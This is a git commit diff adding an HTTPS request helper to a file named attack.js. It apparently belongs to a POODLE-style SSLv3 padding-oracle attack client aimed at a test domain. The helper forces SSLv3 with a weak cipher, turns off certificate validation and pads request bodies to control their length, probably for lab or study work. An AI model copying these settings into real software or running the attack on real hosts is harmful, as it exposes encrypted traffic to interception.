1b9b6dbc815fb8205fea65c6e9a1ec49a25e1d7b
GoRuGoo <goru.technology@gmail.com>
2025-01-15 08:24:14 +0900

    fix: sendRequestを移し忘れていたので修正

--- client/attack.js
+++ client/attack.js
@@ -53,4 +53,58 @@ function queryNextRequest() {
     );
 }
 
+
+function sendRequest(method, urlStr, data, callback, errorcallback, timeout) {
+    const parsedUrl = url.parse(urlStr);
+
+    const sslOptions = {
+        port: 443,
+        ciphers: 'DES-CBC3-SHA',
+        secureProtocol: 'SSLv3_method',
+        rejectUnauthorized: false
+    };
+
+    const defaultOptions = {
+        hostname: parsedUrl.hostname,
+        path: parsedUrl.path,
+        method: method || 'GET',
+    }
+
+    //もしもSSLv3への通信であるのならば、SSLv3用のオプションがないと鍵交換等でエラーが出てしまうため指定しておく
+    if (parsedUrl.hostname === "testdomain.com") {
+        for (var key in sslOptions) {
+            if (sslOptions.hasOwnProperty(key)) {
+                defaultOptions[key] = sslOptions[key];
+            }
+        }
+    }
+
+
+    const req = https.request(defaultOptions, function (res) {
+        var responseData = '';
+        res.on('data', function (chunk) {
+            responseData += chunk; // Append each chunk to responseData
+        });
+
+        res.on('end', function () {
+            callback && callback(responseData.toString());
+        });
+    });
+
+    req.on('error', function (err) {
+        errorcallback && errorcallback(err.code, err.message);
+    });
+
+    req.setTimeout(timeout || 5000, function () {
+        req.abort();
+        if (errorcallback) errorcallback('ETIMEDOUT', 'Request timed out');
+    });
+
+    if (data) {
+        req.write(Array(101).join('a') + data);
+    }
+
+    req.end();
+}
+
 performSSLRequest();
